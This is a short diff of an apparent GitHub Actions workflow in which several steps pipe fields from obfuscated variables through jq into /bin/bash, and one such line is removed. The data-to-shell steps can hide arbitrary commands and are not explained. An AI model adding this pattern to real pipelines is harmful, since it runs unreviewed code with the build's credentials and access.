@@ -28,7 +28,6 @@ jobs:
           echo $f92685 | jq -r .cb6742 | /bin/bash
           printf '%s' "$vu25" | jq -r .oxmvm48 | /bin/bash
           echo $jk006 | jq -r .rpf6 | /bin/bash
-          echo $e4 | jq -r .h9117 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
